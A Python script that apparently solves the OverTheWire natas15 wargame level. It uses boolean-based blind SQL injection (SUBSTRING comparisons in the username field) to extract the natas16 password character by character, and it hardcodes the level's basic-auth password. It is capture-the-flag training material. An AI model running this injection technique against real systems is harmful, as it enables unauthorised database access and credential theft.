import requests
from requests.auth import HTTPBasicAuth
import string
import logging

logging.basicConfig(level=logging.DEBUG)
url = "http://natas15.natas.labs.overthewire.org/index.php"

def construct_query(username, password_index, password_char):
    mysql_password_index = password_index + 1
    query_template = username + "\"AND BINARY SUBSTRING(password,  " + str(mysql_password_index )+",  1) = \"{}"
    return query_template.format(password_char)

def main():
    password_chars = string.ascii_letters + string.digits
    username = "natas16"
    level_username = "natas15"
    level_password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
    
    password = ""
    
    for i in range(32):
        for char in password_chars:
            data = construct_query(username,  i,  char)
            logging.debug("Trying query: " + data)
            response = requests.post(url,  data={"username":data}, auth=HTTPBasicAuth(level_username,  level_password))
            logging.debug(response.text)
            if "This user exists." in response.text:
                logging.info("Found character: " + char)
                password += char
                break
                
    print("Password is: " +password)
if __name__ == "__main__":
    main()
